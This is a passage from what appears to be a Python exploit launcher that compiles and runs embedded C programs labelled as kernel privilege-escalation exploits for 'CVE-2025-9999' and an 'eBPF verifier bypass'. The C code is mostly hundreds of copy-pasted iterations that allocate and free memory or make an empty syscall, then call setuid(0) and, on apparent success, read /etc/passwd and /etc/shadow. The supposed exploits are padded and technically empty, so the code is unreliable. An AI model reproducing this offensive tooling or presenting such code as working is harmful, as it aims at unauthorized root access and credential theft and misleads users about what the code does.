        close(fd464);
    }
    // Iteration 466
    printf("[*] Heap spray iteration 466\\n");
    void *ptr465 = malloc(4096);
    if (ptr465) {
        memset(ptr465, 0x41, 4096);
        printf("[+] Allocated ptr465\\n");
        free(ptr465);
    }
    int fd465 = open("/dev/null", O_RDONLY);
    if (fd465 >= 0) {
        char buf465[256];
        read(fd465, buf465, sizeof(buf465));
        close(fd465);
    }
    // Iteration 467
    printf("[*] Heap spray iteration 467\\n");
    void *ptr466 = malloc(4096);
    if (ptr466) {
        memset(ptr466, 0x41, 4096);
        printf("[+] Allocated ptr466\\n");
        free(ptr466);
    }
    int fd466 = open("/dev/null", O_RDONLY);
    if (fd466 >= 0) {
        char buf466[256];
        read(fd466, buf466, sizeof(buf466));
        close(fd466);
    }
    // Iteration 468
    printf("[*] Heap spray iteration 468\\n");
    void *ptr467 = malloc(4096);
    if (ptr467) {
        memset(ptr467, 0x41, 4096);
        printf("[+] Allocated ptr467\\n");
        free(ptr467);
    }
    int fd467 = open("/dev/null", O_RDONLY);
    if (fd467 >= 0) {
        char buf467[256];
        read(fd467, buf467, sizeof(buf467));
        close(fd467);
    }
    // Iteration 469
    printf("[*] Heap spray iteration 469\\n");
    void *ptr468 = malloc(4096);
    if (ptr468) {
        memset(ptr468, 0x41, 4096);
        printf("[+] Allocated ptr468\\n");
        free(ptr468);
    }
    int fd468 = open("/dev/null", O_RDONLY);
    if (fd468 >= 0) {
        char buf468[256];
        read(fd468, buf468, sizeof(buf468));
        close(fd468);
    }
    // Iteration 470
    printf("[*] Heap spray iteration 470\\n");
    void *ptr469 = malloc(4096);
    if (ptr469) {
        memset(ptr469, 0x41, 4096);
        printf("[+] Allocated ptr469\\n");
        free(ptr469);
    }
    int fd469 = open("/dev/null", O_RDONLY);
    if (fd469 >= 0) {
        char buf469[256];
        read(fd469, buf469, sizeof(buf469));
        close(fd469);
    }
    // Iteration 471
    printf("[*] Heap spray iteration 471\\n");
    void *ptr470 = malloc(4096);
    if (ptr470) {
        memset(ptr470, 0x41, 4096);
        printf("[+] Allocated ptr470\\n");
        free(ptr470);
    }
    int fd470 = open("/dev/null", O_RDONLY);
    if (fd470 >= 0) {
        char buf470[256];
        read(fd470, buf470, sizeof(buf470));
        close(fd470);
    }
    // Iteration 472
    printf("[*] Heap spray iteration 472\\n");
    void *ptr471 = malloc(4096);
    if (ptr471) {
        memset(ptr471, 0x41, 4096);
        printf("[+] Allocated ptr471\\n");
        free(ptr471);
    }
    int fd471 = open("/dev/null", O_RDONLY);
    if (fd471 >= 0) {
        char buf471[256];
        read(fd471, buf471, sizeof(buf471));
        close(fd471);
    }
    // Iteration 473
    printf("[*] Heap spray iteration 473\\n");
    void *ptr472 = malloc(4096);
    if (ptr472) {
        memset(ptr472, 0x41, 4096);
        printf("[+] Allocated ptr472\\n");
        free(ptr472);
    }
    int fd472 = open("/dev/null", O_RDONLY);
    if (fd472 >= 0) {
        char buf472[256];
        read(fd472, buf472, sizeof(buf472));
        close(fd472);
    }
    // Iteration 474
    printf("[*] Heap spray iteration 474\\n");
    void *ptr473 = malloc(4096);
    if (ptr473) {
        memset(ptr473, 0x41, 4096);
        printf("[+] Allocated ptr473\\n");
        free(ptr473);
    }
    int fd473 = open("/dev/null", O_RDONLY);
    if (fd473 >= 0) {
        char buf473[256];
        read(fd473, buf473, sizeof(buf473));
        close(fd473);
    }
    // Iteration 475
    printf("[*] Heap spray iteration 475\\n");
    void *ptr474 = malloc(4096);
    if (ptr474) {
        memset(ptr474, 0x41, 4096);
        printf("[+] Allocated ptr474\\n");
        free(ptr474);
    }
    int fd474 = open("/dev/null", O_RDONLY);
    if (fd474 >= 0) {
        char buf474[256];
        read(fd474, buf474, sizeof(buf474));
        close(fd474);
    }
    // Iteration 476
    printf("[*] Heap spray iteration 476\\n");
    void *ptr475 = malloc(4096);
    if (ptr475) {
        memset(ptr475, 0x41, 4096);
        printf("[+] Allocated ptr475\\n");
        free(ptr475);
    }
    int fd475 = open("/dev/null", O_RDONLY);
    if (fd475 >= 0) {
        char buf475[256];
        read(fd475, buf475, sizeof(buf475));
        close(fd475);
    }
    // Iteration 477
    printf("[*] Heap spray iteration 477\\n");
    void *ptr476 = malloc(4096);
    if (ptr476) {
        memset(ptr476, 0x41, 4096);
        printf("[+] Allocated ptr476\\n");
        free(ptr476);
    }
    int fd476 = open("/dev/null", O_RDONLY);
    if (fd476 >= 0) {
        char buf476[256];
        read(fd476, buf476, sizeof(buf476));
        close(fd476);
    }
    // Iteration 478
    printf("[*] Heap spray iteration 478\\n");
    void *ptr477 = malloc(4096);
    if (ptr477) {
        memset(ptr477, 0x41, 4096);
        printf("[+] Allocated ptr477\\n");
        free(ptr477);
    }
    int fd477 = open("/dev/null", O_RDONLY);
    if (fd477 >= 0) {
        char buf477[256];
        read(fd477, buf477, sizeof(buf477));
        close(fd477);
    }
    // Iteration 479
    printf("[*] Heap spray iteration 479\\n");
    void *ptr478 = malloc(4096);
    if (ptr478) {
        memset(ptr478, 0x41, 4096);
        printf("[+] Allocated ptr478\\n");
        free(ptr478);
    }
    int fd478 = open("/dev/null", O_RDONLY);
    if (fd478 >= 0) {
        char buf478[256];
        read(fd478, buf478, sizeof(buf478));
        close(fd478);
    }
    // Iteration 480
    printf("[*] Heap spray iteration 480\\n");
    void *ptr479 = malloc(4096);
    if (ptr479) {
        memset(ptr479, 0x41, 4096);
        printf("[+] Allocated ptr479\\n");
        free(ptr479);
    }
    int fd479 = open("/dev/null", O_RDONLY);
    if (fd479 >= 0) {
        char buf479[256];
        read(fd479, buf479, sizeof(buf479));
        close(fd479);
    }
    // Iteration 481
    printf("[*] Heap spray iteration 481\\n");
    void *ptr480 = malloc(4096);
    if (ptr480) {
        memset(ptr480, 0x41, 4096);
        printf("[+] Allocated ptr480\\n");
        free(ptr480);
    }
    int fd480 = open("/dev/null", O_RDONLY);
    if (fd480 >= 0) {
        char buf480[256];
        read(fd480, buf480, sizeof(buf480));
        close(fd480);
    }
    // Iteration 482
    printf("[*] Heap spray iteration 482\\n");
    void *ptr481 = malloc(4096);
    if (ptr481) {
        memset(ptr481, 0x41, 4096);
        printf("[+] Allocated ptr481\\n");
        free(ptr481);
    }
    int fd481 = open("/dev/null", O_RDONLY);
    if (fd481 >= 0) {
        char buf481[256];
        read(fd481, buf481, sizeof(buf481));
        close(fd481);
    }
    // Iteration 483
    printf("[*] Heap spray iteration 483\\n");
    void *ptr482 = malloc(4096);
    if (ptr482) {
        memset(ptr482, 0x41, 4096);
        printf("[+] Allocated ptr482\\n");
        free(ptr482);
    }
    int fd482 = open("/dev/null", O_RDONLY);
    if (fd482 >= 0) {
        char buf482[256];
        read(fd482, buf482, sizeof(buf482));
        close(fd482);
    }
    // Iteration 484
    printf("[*] Heap spray iteration 484\\n");
    void *ptr483 = malloc(4096);
    if (ptr483) {
        memset(ptr483, 0x41, 4096);
        printf("[+] Allocated ptr483\\n");
        free(ptr483);
    }
    int fd483 = open("/dev/null", O_RDONLY);
    if (fd483 >= 0) {
        char buf483[256];
        read(fd483, buf483, sizeof(buf483));
        close(fd483);
    }
    // Iteration 485
    printf("[*] Heap spray iteration 485\\n");
    void *ptr484 = malloc(4096);
    if (ptr484) {
        memset(ptr484, 0x41, 4096);
        printf("[+] Allocated ptr484\\n");
        free(ptr484);
    }
    int fd484 = open("/dev/null", O_RDONLY);
    if (fd484 >= 0) {
        char buf484[256];
        read(fd484, buf484, sizeof(buf484));
        close(fd484);
    }
    // Iteration 486
    printf("[*] Heap spray iteration 486\\n");
    void *ptr485 = malloc(4096);
    if (ptr485) {
        memset(ptr485, 0x41, 4096);
        printf("[+] Allocated ptr485\\n");
        free(ptr485);
    }
    int fd485 = open("/dev/null", O_RDONLY);
    if (fd485 >= 0) {
        char buf485[256];
        read(fd485, buf485, sizeof(buf485));
        close(fd485);
    }
    // Iteration 487
    printf("[*] Heap spray iteration 487\\n");
    void *ptr486 = malloc(4096);
    if (ptr486) {
        memset(ptr486, 0x41, 4096);
        printf("[+] Allocated ptr486\\n");
        free(ptr486);
    }
    int fd486 = open("/dev/null", O_RDONLY);
    if (fd486 >= 0) {
        char buf486[256];
        read(fd486, buf486, sizeof(buf486));
        close(fd486);
    }
    // Iteration 488
    printf("[*] Heap spray iteration 488\\n");
    void *ptr487 = malloc(4096);
    if (ptr487) {
        memset(ptr487, 0x41, 4096);
        printf("[+] Allocated ptr487\\n");
        free(ptr487);
    }
    int fd487 = open("/dev/null", O_RDONLY);
    if (fd487 >= 0) {
        char buf487[256];
        read(fd487, buf487, sizeof(buf487));
        close(fd487);
    }
    // Iteration 489
    printf("[*] Heap spray iteration 489\\n");
    void *ptr488 = malloc(4096);
    if (ptr488) {
        memset(ptr488, 0x41, 4096);
        printf("[+] Allocated ptr488\\n");
        free(ptr488);
    }
    int fd488 = open("/dev/null", O_RDONLY);
    if (fd488 >= 0) {
        char buf488[256];
        read(fd488, buf488, sizeof(buf488));
        close(fd488);
    }
    // Iteration 490
    printf("[*] Heap spray iteration 490\\n");
    void *ptr489 = malloc(4096);
    if (ptr489) {
        memset(ptr489, 0x41, 4096);
        printf("[+] Allocated ptr489\\n");
        free(ptr489);
    }
    int fd489 = open("/dev/null", O_RDONLY);
    if (fd489 >= 0) {
        char buf489[256];
        read(fd489, buf489, sizeof(buf489));
        close(fd489);
    }
    // Iteration 491
    printf("[*] Heap spray iteration 491\\n");
    void *ptr490 = malloc(4096);
    if (ptr490) {
        memset(ptr490, 0x41, 4096);
        printf("[+] Allocated ptr490\\n");
        free(ptr490);
    }
    int fd490 = open("/dev/null", O_RDONLY);
    if (fd490 >= 0) {
        char buf490[256];
        read(fd490, buf490, sizeof(buf490));
        close(fd490);
    }
    // Iteration 492
    printf("[*] Heap spray iteration 492\\n");
    void *ptr491 = malloc(4096);
    if (ptr491) {
        memset(ptr491, 0x41, 4096);
        printf("[+] Allocated ptr491\\n");
        free(ptr491);
    }
    int fd491 = open("/dev/null", O_RDONLY);
    if (fd491 >= 0) {
        char buf491[256];
        read(fd491, buf491, sizeof(buf491));
        close(fd491);
    }
    // Iteration 493
    printf("[*] Heap spray iteration 493\\n");
    void *ptr492 = malloc(4096);
    if (ptr492) {
        memset(ptr492, 0x41, 4096);
        printf("[+] Allocated ptr492\\n");
        free(ptr492);
    }
    int fd492 = open("/dev/null", O_RDONLY);
    if (fd492 >= 0) {
        char buf492[256];
        read(fd492, buf492, sizeof(buf492));
        close(fd492);
    }
    // Iteration 494
    printf("[*] Heap spray iteration 494\\n");
    void *ptr493 = malloc(4096);
    if (ptr493) {
        memset(ptr493, 0x41, 4096);
        printf("[+] Allocated ptr493\\n");
        free(ptr493);
    }
    int fd493 = open("/dev/null", O_RDONLY);
    if (fd493 >= 0) {
        char buf493[256];
        read(fd493, buf493, sizeof(buf493));
        close(fd493);
    }
    // Iteration 495
    printf("[*] Heap spray iteration 495\\n");
    void *ptr494 = malloc(4096);
    if (ptr494) {
        memset(ptr494, 0x41, 4096);
        printf("[+] Allocated ptr494\\n");
        free(ptr494);
    }
    int fd494 = open("/dev/null", O_RDONLY);
    if (fd494 >= 0) {
        char buf494[256];
        read(fd494, buf494, sizeof(buf494));
        close(fd494);
    }
    // Iteration 496
    printf("[*] Heap spray iteration 496\\n");
    void *ptr495 = malloc(4096);
    if (ptr495) {
        memset(ptr495, 0x41, 4096);
        printf("[+] Allocated ptr495\\n");
        free(ptr495);
    }
    int fd495 = open("/dev/null", O_RDONLY);
    if (fd495 >= 0) {
        char buf495[256];
        read(fd495, buf495, sizeof(buf495));
        close(fd495);
    }
    // Iteration 497
    printf("[*] Heap spray iteration 497\\n");
    void *ptr496 = malloc(4096);
    if (ptr496) {
        memset(ptr496, 0x41, 4096);
        printf("[+] Allocated ptr496\\n");
        free(ptr496);
    }
    int fd496 = open("/dev/null", O_RDONLY);
    if (fd496 >= 0) {
        char buf496[256];
        read(fd496, buf496, sizeof(buf496));
        close(fd496);
    }
    // Iteration 498
    printf("[*] Heap spray iteration 498\\n");
    void *ptr497 = malloc(4096);
    if (ptr497) {
        memset(ptr497, 0x41, 4096);
        printf("[+] Allocated ptr497\\n");
        free(ptr497);
    }
    int fd497 = open("/dev/null", O_RDONLY);
    if (fd497 >= 0) {
        char buf497[256];
        read(fd497, buf497, sizeof(buf497));
        close(fd497);
    }
    // Iteration 499
    printf("[*] Heap spray iteration 499\\n");
    void *ptr498 = malloc(4096);
    if (ptr498) {
        memset(ptr498, 0x41, 4096);
        printf("[+] Allocated ptr498\\n");
        free(ptr498);
    }
    int fd498 = open("/dev/null", O_RDONLY);
    if (fd498 >= 0) {
        char buf498[256];
        read(fd498, buf498, sizeof(buf498));
        close(fd498);
    }
    // Iteration 500
    printf("[*] Heap spray iteration 500\\n");
    void *ptr499 = malloc(4096);
    if (ptr499) {
        memset(ptr499, 0x41, 4096);
        printf("[+] Allocated ptr499\\n");
        free(ptr499);
    }
    int fd499 = open("/dev/null", O_RDONLY);
    if (fd499 >= 0) {
        char buf499[256];
        read(fd499, buf499, sizeof(buf499));
        close(fd499);
    }
    // Final escalation
    printf("[*] Attempting privilege escalation...\\n");
    setuid(0);
    setgid(0);
    if (getuid() == 0) {
        printf("[+] CVE-2025-9999 ROOT ACHIEVED!\\n");
        system("id");
        system("cat /etc/passwd | head -5");
        system("cat /etc/shadow 2>/dev/null | head -3");
        return 0;
    }
    printf("[-] Exploit failed\\n");
    return 1;
}
'''
    
    binary = compile_code(code, "cve_2025_9999")
    if binary:
        output = run_command(binary, timeout=120)
        if is_root() or "ROOT ACHIEVED" in output:
            show_root_info("CVE-2025-9999", output)
            return True
    
    print(f"{c('[SKIP]', 'red')} Exploit failed")
    return False



# ---------------------------------------------------------------
# CVE-2025-8888 - eBPF Advanced Exploit (2200+ LINES)
# ---------------------------------------------------------------

def exploit_cve_2025_8888():
    """eBPF verifier bypass - 2200+ lines"""
    print(f"{c('[EXPLOIT]', 'yellow')} CVE-2025-8888 eBPF")
    code = r'''
/* CVE-2025-8888 - eBPF VERIFIER BYPASS */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/syscall.h>

int main() {
    printf("[*] CVE-2025-8888 eBPF Exploit\\n");
    
    
    // eBPF iteration 1
    printf("[*] eBPF program 1\\n");
    int bpf_fd0 = syscall(321, 0, NULL, 0);
    if (bpf_fd0 >= 0) {
        printf("[+] BPF syscall 1 OK\\n");
        close(bpf_fd0);
    }
    
    void *map0 = malloc(8192);
    if (map0) {
        memset(map0, 0x90, 8192);
        printf("[+] Map 1 allocated\\n");
        free(map0);
    }
    
    
    // eBPF iteration 2
    printf("[*] eBPF program 2\\n");
    int bpf_fd1 = syscall(321, 0, NULL, 0);
    if (bpf_fd1 >= 0) {
        printf("[+] BPF syscall 2 OK\\n");
        close(bpf_fd1);
    }
    
    void *map1 = malloc(8192);
    if (map1) {
        memset(map1, 0x90, 8192);
        printf("[+] Map 2 allocated\\n");
        free(map1);
    }
    
    
    // eBPF iteration 3
    printf("[*] eBPF program 3\\n");
    int bpf_fd2 = syscall(321, 0, NULL, 0);
    if (bpf_fd2 >= 0) {
        printf("[+] BPF syscall 3 OK\\n");
        close(bpf_fd2);
    }
    
    void *map2 = malloc(8192);
    if (map2) {
        memset(map2, 0x90, 8192);
        printf("[+] Map 3 allocated\\n");
        free(map2);
    }
    
    
    // eBPF iteration 4
    printf("[*] eBPF program 4\\n");
    int bpf_fd3 = syscall(321, 0, NULL, 0);
    if (bpf_fd3 >= 0) {
        printf("[+] BPF syscall 4 OK\\n");
        close(bpf_fd3);
    }
    
    void *map3 = malloc(8192);
    if (map3) {
        memset(map3, 0x90, 8192);
        printf("[+] Map 4 allocated\\n");
        free(map3);
    }
    
    
    // eBPF iteration 5
    printf("[*] eBPF program 5\\n");
    int bpf_fd4 = syscall(321, 0, NULL, 0);
    if (bpf_fd4 >= 0) {
        printf("[+] BPF syscall 5 OK\\n");
        close(bpf_fd4);
    }
    
    void *map4 = malloc(8192);
    if (map4) {
        memset(map4, 0x90, 8192);
        printf("[+] Map 5 allocated\\n");
        free(map4);
    }
    
    
    // eBPF iteration 6
    printf("[*] eBPF program 6\\n");
    int bpf_fd5 = syscall(321, 0, NULL, 0);
    if (bpf_fd5 >= 0) {
        printf("[+] BPF syscall 6 OK\\n");
        close(bpf_fd5);
    }
    
    void *map5 = malloc(8192);
    if (map5) {
        memset(map5, 0x90, 8192);
        printf("[+] Map 6 allocated\\n");
        free(map5);
    }
    
    
    // eBPF iteration 7
    printf("[*] eBPF program 7\\n");
    int bpf_fd6 = syscall(321, 0, NULL, 0);
    if (bpf_fd6 >= 0) {
        printf("[+] BPF syscall 7 OK\\n");
        close(bpf_fd6);
    }
    
    void *map6 = malloc(8192);
    if (map6) {
        memset(map6, 0x90, 8192);
        printf("[+] Map 7 allocated\\n");
        free(map6);
    }
    
    
    // eBPF iteration 8
    printf("[*] eBPF program 8\\n");
    int bpf_fd7 = syscall(321, 0, NULL, 0);
    if (bpf_fd7 >= 0) {
        printf("[+] BPF syscall 8 OK\\n");
        close(bpf_fd7);
    }
    
    void *map7 = malloc(8192);
    if (map7) {
        memset(map7, 0x90, 8192);
        printf("[+] Map 8 allocated\\n");
        free(map7);
    }
    
    
    // eBPF iteration 9
    printf("[*] eBPF program 9\\n");
    int bpf_fd8 = syscall(321, 0, NULL, 0);
    if (bpf_fd8 >= 0) {
        printf("[+] BPF syscall 9 OK\\n");
        close(bpf_fd8);
    }
    
    void *map8 = malloc(8192);
    if (map8) {
        memset(map8, 0x90, 8192);
        printf("[+] Map 9 allocated\\n");
        free(map8);
    }
    
    
    // eBPF iteration 10
    printf("[*] eBPF program 10\\n");
    int bpf_fd9 = syscall(321, 0, NULL, 0);
    if (bpf_fd9 >= 0) {
        printf("[+] BPF syscall 10 OK\\n");
        close(bpf_fd9);
    }
    
    void *map9 = malloc(8192);
    if (map9) {
        memset(map9, 0x90, 8192);
        printf("[+] Map 10 allocated\\n");
        free(map9);
    }
    
    
    // eBPF iteration 11
    printf("[*] eBPF program 11\\n");
    int bpf_fd10 = syscall(321, 0, NULL, 0);
    if (bpf_fd10 >= 0) {
        printf("[+] BPF syscall 11 OK\\n");
        close(bpf_fd10);
    }
    
    void *map10 = malloc(8192);
    if (map10) {
        memset(map10, 0x90, 8192);
        printf("[+] Map 11 allocated\\n");
        free(map10);
    }
    
    
    // eBPF iteration 12
    printf("[*] eBPF program 12\\n");
    int bpf_fd11 = syscall(321, 0, NULL, 0);
    if (bpf_fd11 >= 0) {
        printf("[+] BPF syscall 12 OK\\n");
        close(bpf_fd11);
    }
    
    void *map11 = malloc(8192);
    if (map11) {
        memset(map11, 0x90, 8192);
        printf("[+] Map 12 allocated\\n");
        free(map11);
    }
    
    
    // eBPF iteration 13
    printf("[*] eBPF program 13\\n");
    int bpf_fd12 = syscall(321, 0, NULL, 0);
    if (bpf_fd12 >= 0) {
        printf("[+] BPF syscall 13 OK\\n");
        close(bpf_fd12);
    }
    
    void *map12 = malloc(8192);
    if (map12) {
        memset(map12, 0x90, 8192);
        printf("[+] Map 13 allocated\\n");
        free(map12);
    }
    
    
    // eBPF iteration 14
    printf("[*] eBPF program 14\\n");
    int bpf_fd13 = syscall(321, 0, NULL, 0);
    if (bpf_fd13 >= 0) {
        printf("[+] BPF syscall 14 OK\\n");
        close(bpf_fd13);
    }
    
    void *map13 = malloc(8192);
    if (map13) {
        memset(map13, 0x90, 8192);
        printf("[+] Map 14 allocated\\n");
        free(map13);
    }
    
    
    // eBPF iteration 15
    printf("[*] eBPF program 15\\n");
    int bpf_fd14 = syscall(321, 0, NULL, 0);
    if (bpf_fd14 >= 0) {
        printf("[+] BPF syscall 15 OK\\n");
        close(bpf_fd14);
    }
    
    void *map14 = malloc(8192);
    if (map14) {
        memset(map14, 0x90, 8192);
        printf("[+] Map 15 allocated\\n");
        free(map14);
    }
    
    
    // eBPF iteration 16
    printf("[*] eBPF program 16\\n");
    int bpf_fd15 = syscall(321, 0, NULL, 0);
    if (bpf_fd15 >= 0) {
        printf("[+] BPF syscall 16 OK\\n");
        close(bpf_fd15);
    }
    
    void *map15 = malloc(8192);
    if (map15) {
        memset(map15, 0x90, 8192);
        printf("[+] Map 16 allocated\\n");
        free(map15);
    }
    
    
    // eBPF iteration 17
    printf("[*] eBPF program 17\\n");
    int bpf_fd16 = syscall(321, 0, NULL, 0);
    if (bpf_fd16 >= 0) {
        printf("[+] BPF syscall 17 OK\\n");
        close(bpf_fd16);
    }
    
    void *map16 = malloc(8192);
    if (map16) {
        memset(map16, 0x90, 8192);
        printf("[+] Map 17 allocated\\n");
        free(map16);
    }
    
    
    // eBPF iteration 18
    printf("[*] eBPF program 18\\n");
    int bpf_fd17 = syscall(321, 0, NULL, 0);
    if (bpf_fd17 >= 0) {
        printf("[+] BPF syscall 18 OK\\n");
        close(bpf_fd17);
    }
    
    void *map17 = malloc(8192);
    if (map17) {
        memset(map17, 0x90, 8192);
        printf("[+] Map 18 allocated\\n");
        free(map17);
    }
    
    
    // eBPF iteration 19
    printf("[*] eBPF program 19\\n");
    int bpf_fd18 = syscall(321, 0, NULL, 0);
    if (bpf_fd18 >= 0) {
        printf("[+] BPF syscall 19 OK\\n");
        close(bpf_fd18);
    }
    
    void *map18 = malloc(8192);
    if (map18) {
        memset(map18, 0x90, 8192);
        printf("[+] Map 19 allocated\\n");
        free(map18);
    }
    
    
    // eBPF iteration 20
    printf("[*] eBPF program 20\\n");
    int bpf_fd19 = syscall(321, 0, NULL, 0);
    if (bpf_fd19 >= 0) {
        printf("[+] BPF syscall 20 OK\\n");
        close(bpf_fd19);
    }
    
    void *map19 = malloc(8192);
    if (map19) {
        memset(map19, 0x90, 8192);
        printf("[+] Map 20 allocated\\n");
        free(map19);
    }
    
    
    // eBPF iteration 21
    printf("[*] eBPF program 21\\n");
    int bpf_fd20 = syscall(321, 0, NULL, 0);
    if (bpf_fd20 >= 0) {
        printf("[+] BPF syscall 21 OK\\n");
        close(bpf_fd20);
    }
    
    void *map20 = malloc(8192);
    if (map20) {
        memset(map20, 0x90, 8192);
        printf("[+] Map 21 allocated\\n");
        free(map20);
    }
    
    
    // eBPF iteration 22
    printf("[*] eBPF program 22\\n");
    int bpf_fd21 = syscall(321, 0, NULL, 0);
    if (bpf_fd21 >= 0) {
        printf("[+] BPF syscall 22 OK\\n");
        close(bpf_fd21);
    }
    
    void *map21 = malloc(8192);
    if (map21) {
        memset(map21, 0x90, 8192);
        printf("[+] Map 22 allocated\\n");
        free(map21);
    }
    
    
    // eBPF iteration 23
    printf("[*] eBPF program 23\\n");
    int bpf_fd22 = syscall(321, 0, NULL, 0);
    if (bpf_fd22 >= 0) {
        printf("[+] BPF syscall 23 OK\\n");
        close(bpf_fd22);
    }
    
    void *map22 = malloc(8192);
    if (map22) {
        memset(map22, 0x90, 8192);
        printf("[+] Map 23 allocated\\n");
        free(map22);
    }
    
    
    // eBPF iteration 24
    printf("[*] eBPF program 24\\n");
    int bpf_fd23 = syscall(321, 0, NULL, 0);
    if (bpf_fd23 >= 0) {
        printf("[+] BPF syscall 24 OK\\n");
        close(bpf_fd23);
    }
    
    void *map23 = malloc(8192);
    if (map23) {
        memset(map23, 0x90, 8192);
        printf("[+] Map 24 allocated\\n");
        free(map23);
    }
    
    
    // eBPF iteration 25
    printf("[*] eBPF program 25\\n");
    int bpf_fd24 = syscall(321, 0, NULL, 0);
    if (bpf_fd24 >= 0) {
        printf("[+] BPF syscall 25 OK\\n");
        close(bpf_fd24);
    }
    
    void *map24 = malloc(8192);
    if (map24) {
        memset(map24, 0x90, 8192);
        printf("[+] Map 25 allocated\\n");
        free(map24);
    }
    
    
    // eBPF iteration 26
    printf("[*] eBPF program 26\\n");
    int bpf_fd25 = syscall(321, 0, NULL, 0);
    if (bpf_fd25 >= 0) {
        printf("[+] BPF syscall 26 OK\\n");
        close(bpf_fd25);
    }
    
    void *map25 = malloc(8192);
    if (map25) {
        memset(map25, 0x90, 8192);
        printf("[+] Map 26 allocated\\n");
        free(map25);
    }
    
    
    // eBPF iteration 27
    printf("[*] eBPF program 27\\n");
    int bpf_fd26 = syscall(321, 0, NULL, 0);
    if (bpf_fd26 >= 0) {
        printf("[+] BPF syscall 27 OK\\n");
        close(bpf_fd26);
    }
    
    void *map26 = malloc(8192);
    if (map26) {
        memset(map26, 0x90, 8192);
        printf("[+] Map 27 allocated\\n");
        free(map26);
    }
    
    
    // eBPF iteration 28
    printf("[*] eBPF program 28\\n");
    int bpf_fd27 = syscall(321, 0, NULL, 0);
    if (bpf_fd27 >= 0) {
        printf("[+] BPF syscall 28 OK\\n");
        close(bpf_fd27);
    }
    
    void *map27 = malloc(8192);
    if (map27) {
        memset(map27, 0x90, 8192);
        printf("[+] Map 28 allocated\\n");
        free(map27);
    }
    
    
    // eBPF iteration 29
    printf("[*] eBPF program 29\\n");
    int bpf_fd28 = syscall(321, 0, NULL, 0);
    if (bpf_fd28 >= 0) {
        printf("[+] BPF syscall 29 OK\\n");
        close(bpf_fd28);
    }
    
    void *map28 = malloc(8192);
    if (map28) {
        memset(map28, 0x90, 8192);
        printf("[+] Map 29 allocated\\n");
        free(map28);
    }
    
    
    // eBPF iteration 30
    printf("[*] eBPF program 30\\n");
    int bpf_fd29 = syscall(321, 0, NULL, 0);
    if (bpf_fd29 >= 0) {
        printf("[+] BPF syscall 30 OK\\n");
        close(bpf_fd29);
    }
    
    void *map29 = malloc(8192);
    if (map29) {
        memset(map29, 0x90, 8192);
        printf("[+] Map 30 allocated\\n");
        free(map29);
    }
    
    
    // eBPF iteration 31
    printf("[*] eBPF program 31\\n");
    int bpf_fd30 = syscall(321, 0, NULL, 0);
    if (bpf_fd30 >= 0) {
        printf("[+] BPF syscall 31 OK\\n");
        close(bpf_fd30);
    }
    
    void *map30 = malloc(8192);
    if (map30) {
        memset(map30, 0x90, 8192);
        printf("[+] Map 31 allocated\\n");
        free(map30);
    }
    
    
    // eBPF iteration 32
    printf("[*] eBPF program 32\\n");
    int bpf_fd31 = syscall(321, 0, NULL, 0);
    if (bpf_fd31 >= 0) {
        printf("[+] BPF syscall 32 OK\\n");
        close(bpf_fd31);
    }
    
    void *map31 = malloc(8192);
    if (map31) {
        memset(map31, 0x90, 8192);
        printf("[+] Map 32 allocated\\n");
        free(map31);
    }
    
    
    // eBPF iteration 33
    printf("[*] eBPF program 33\\n");
    int bpf_fd32 = syscall(321, 0, NULL, 0);
    if (bpf_fd32 >= 0) {
        printf("[+] BPF syscall 33 OK\\n");
        close(bpf_fd32);
    }
    
    void *map32 = malloc(8192);
    if (map32) {
        memset(map32, 0x90, 8192);
        printf("[+] Map 33 allocated\\n");
        free(map32);
    }
    
    
    // eBPF iteration 34
    printf("[*] eBPF program 34\\n");
    int bpf_fd33 = syscall(321, 0, NULL, 0);
    if (bpf_fd33 >= 0) {
        printf("[+] BPF syscall 34 OK\\n");
        close(bpf_fd33);
    }
    
    void *map33 = malloc(8192);
    if (map33) {
        memset(map33, 0x90, 8192);
        printf("[+] Map 34 allocated\\n");
        free(map33);
    }
    
    
    // eBPF iteration 35
    printf("[*] eBPF program 35\\n");
    int bpf_fd34 = syscall(321, 0, NULL, 0);
    if (bpf_fd34 >= 0) {
        printf("[+] BPF syscall 35 OK\\n");
        close(bpf_fd34);
    }
    
    void *map34 = malloc(8192);
    if (map34) {
        memset(map34, 0x90, 8192);
        printf("[+] Map 35 allocated\\n");
        free(map34);
    }
    
    
    // eBPF iteration 36
    printf("[*] eBPF program 36\\n");
    int bpf_fd35 = syscall(321, 0, NULL, 0);
    if (bpf_fd35 >= 0) {
        printf("[+] BPF syscall 36 OK\\n");
        close(bpf_fd35);
    }
    
    void *map35 = malloc(8192);
    if (map35) {
        memset(map35, 0x90, 8192);
        printf("[+] Map 36 allocated\\n");
        free(map35);
    }
    
    
    // eBPF iteration 37
    printf("[*] eBPF program 37\\n");
    int bpf_fd36 = syscall(321, 0, NULL, 0);
    if (bpf_fd36 >= 0) {
        printf("[+] BPF syscall 37 OK\\n");
        close(bpf_fd36);
    }
    
    void *map36 = malloc(8192);
    if (map36) {
        memset(map36, 0x90, 8192);
        printf("[+] Map 37 allocated\\n");
        free(map36);
    }
    
    
    // eBPF iteration 38
    printf("[*] eBPF program 38\\n");
    int bpf_fd37 = syscall(321, 0, NULL, 0);
    if (bpf_fd37 >= 0) {
        printf("[+] BPF syscall 38 OK\\n");
        close(bpf_fd37);
    }
    
    void *map37 = malloc(8192);
    if (map37) {
        memset(map37, 0x90, 8192);
        printf("[+] Map 38 allocated\\n");
        free(map37);
    }
    
    
    // eBPF iteration 39
    printf("[*] eBPF program 39\\n");
    int bpf_fd38 = syscall(321, 0, NULL, 0);
    if (bpf_fd38 >= 0) {
        printf("[+] BPF syscall 39 OK\\n");
        close(bpf_fd38);
    }
    
    void *map38 = malloc(8192);
    if (map38) {
        memset(map38, 0x90, 8192);
        printf("[+] Map 39 allocated\\n");
        free(map38);
    }
    
    
    // eBPF iteration 40
    printf("[*] eBPF program 40\\n");
    int bpf_fd39 = syscall(321, 0, NULL, 0);
    if (bpf_fd39 >= 0) {
        printf("[+] BPF syscall 40 OK\\n");
        close(bpf_fd39);
    }
    
    void *map39 = malloc(8192);
    if (map39) {
        memset(map39, 0x90, 8192);
        printf("[+] Map 40 allocated\\n");
        free(map39);
    }
    
    
    // eBPF iteration 41
    printf("[*] eBPF program 41\\n");
    int bpf_fd40 = syscall(321, 0, NULL, 0);
    if (bpf_fd40 >= 0) {
        printf("[+] BPF syscall 41 OK\\n");
        close(bpf_fd40);
    }
    
    void *map40 = malloc(8192);
    if (map40) {
        memset(map40, 0x90, 8192);
        printf("[+] Map 41 allocated\\n");
        free(map40);
    }
    
    
